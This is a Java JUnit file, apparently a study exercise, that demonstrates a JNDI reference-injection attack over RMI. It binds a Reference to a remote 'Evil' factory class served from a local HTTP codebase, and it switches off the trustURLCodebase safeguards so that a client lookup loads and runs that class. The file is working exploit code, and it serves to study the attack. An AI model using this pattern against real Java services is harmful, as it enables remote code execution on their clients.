package org.example.sec.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.junit.Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Properties;

public class Exp {
    private InitialContext getJNDIContext() {
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
        try {
            return new InitialContext(env);
        } catch (NamingException e) {
            throw new RuntimeException(e);
        }
    }

    Person p = new Person("wq", "kant");

    //JNDI提供了一个Reference类来表示某个对象的引用，这个类中包含被引用对象的类信息和地址。
    //当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。
    //factoryLocation可控，注册恶意类，攻击客户端。注意利用条件。
    public void server1(String uri) {
        uri = "http://127.0.0.1:8888/";
        Registry registry = null;
        try {
            registry = LocateRegistry.createRegistry(1099);
            Reference refObj = new Reference("Evil", "Evil", uri);
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
            System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'");
            registry.bind("refObj", refObjWrapper);
            //registry.bind("service", new ServiceImpl());
        } catch (RemoteException e) {
            throw new RuntimeException(e);
        } catch (AlreadyBoundException e) {
            throw new RuntimeException(e);
        } catch (NamingException e) {
            throw new RuntimeException(e);
        }

    }


    //lookup的uri可控，攻击客户端
    public void client1(String uri) {
        uri = "rmi://127.0.0.1:1099/refObj";
        try {
           Object obj = new InitialContext().lookup(uri);

        } catch (NamingException e) {
            throw new RuntimeException(e);
        }
    }

    @Test
    public void exp1() {
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        Exp exp = new Exp();
        exp.server1("");
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        exp.client1("");
    }
}


